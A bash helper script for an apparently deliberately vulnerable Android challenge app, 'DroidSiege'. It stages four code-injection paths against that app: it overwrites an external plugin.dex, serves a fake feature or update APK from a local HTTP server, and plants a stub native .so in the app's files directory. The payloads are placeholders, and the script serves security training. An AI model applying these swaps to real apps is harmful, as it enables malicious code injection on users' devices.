#!/usr/bin/env bash
# DroidSiege — supplychain/dynload tooling pack
# Swaps the writable code paths: external plugin.dex (L1), a hosted 'feature'
# module (L2), an unsigned update payload (L3) and a native .so (L4).
# Requires: adb, a local http server (python3), d8/ndk-build for real payloads.
set -euo pipefail
PKG="com.droidsiege"

echo "== L1: swap the external plugin.dex =="
adb push classes.dex /sdcard/Android/data/$PKG/files/plugin.dex \
  || echo "(compile one: javac + d8; the placeholder magic bytes also demonstrate staging)"

echo
echo "== L2/L3: host the 'feature'/'update' the app fetches over http =="
mkdir -p /tmp/dsdl && echo "placeholder-feature" > /tmp/dsdl/feature.apk
(cd /tmp/dsdl && python3 -m http.server 8099) &
HTTP_PID=$!
echo "serving /tmp/dsdl on :8099 — point the app's fetch (or a proxy) here"
sleep 2; kill $HTTP_PID 2>/dev/null || true

echo
echo "== L4: stage a native .so in filesDir/plugins (ELF magic proves loadability) =="
adb shell run-as $PKG sh -c 'mkdir -p files/plugins && printf "\\x7f\\x45\\x4c\\x46" > files/plugins/native.so'
adb shell run-as $PKG ls -la files/plugins/
echo "press 'Stage native plugin' in the challenge — the reveal shows the load outcome"
